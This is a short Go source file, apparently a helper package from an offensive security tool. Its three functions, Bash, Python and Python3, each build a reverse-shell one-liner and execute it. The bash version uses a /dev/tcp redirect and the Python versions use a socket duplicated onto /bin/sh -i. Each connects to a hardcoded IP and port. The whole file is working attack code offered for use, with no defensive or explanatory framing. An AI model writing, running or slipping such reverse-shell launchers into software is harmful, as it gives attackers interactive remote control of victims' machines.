package utils

import (
	"fmt"
	"os/exec"
	"strings"
)

// if runtime.GOOS == "windows" {
// 	fmt.Println("Can't Execute this on a windows machine")
// } else {
// 	execute()
// }

func executeCommand(command []string) {
	out, err := exec.Command(command[0], command[1:]...).Output()
	if err != nil {
		fmt.Printf("%s", err)
	}
	output := string(out[:])
	fmt.Println(output)
}

func Bash() {
	ip := "127.0.0.1"
	port := "9001"
	command := fmt.Sprintf("bash -c /bin/bash -i >& /dev/tcp/%s/%s 0>&1", ip, port)
	parsed_command := strings.SplitN(command, " ", 3)
	executeCommand(parsed_command)
}

func Python() {
	ip := "127.0.0.1"
	port := "9001"
	command := fmt.Sprintf("python -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"%s\",%s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);", ip, port)
	parsed_command := strings.SplitN(command, " ", 3)
	executeCommand(parsed_command)
}

func Python3() {
	ip := "127.0.0.1"
	port := "9001"
	command := fmt.Sprintf("python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"%s\",%s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);", ip, port)
	parsed_command := strings.SplitN(command, " ", 3)
	executeCommand(parsed_command)
}
